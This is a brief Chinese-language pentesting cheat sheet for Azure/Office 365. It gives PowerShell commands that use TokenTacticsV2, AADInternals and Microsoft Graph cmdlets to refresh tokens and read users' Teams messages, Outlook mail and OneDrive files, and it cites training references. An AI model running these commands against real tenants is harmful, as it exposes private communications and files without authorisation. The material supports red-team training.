# Azure 服务 - Office 365

## Microsoft Teams 消息

```ps1
TokenTacticsV2> RefreshTo-MSTeamsToken -domain domain.local
AADInternals> Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName
```

## Outlook 邮件 (Outlook Mails)

* 读取用户邮件

    ```ps1
    Get-MgUserMessage -UserId <用户 ID> | ft
    Get-MgUserMessageContent -OutFile mail.txt -UserId <用户 ID> -MessageId <消息 ID>
    ```

## OneDrive 文件 (OneDrive Files)

```ps1
$userId = "<用户 ID>"
Import-Module Microsoft.Graph.Files
Get-MgUserDefaultDrive -UserId $userId
Get-MgUserDrive -UserId $UserId  -Debug
Get-MgDrive -top 1
```

## 参考资料 (References)

* [Pentesting Azure Mindmap - Alexis Danizan](https://github.com/synacktiv/Mindmaps)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
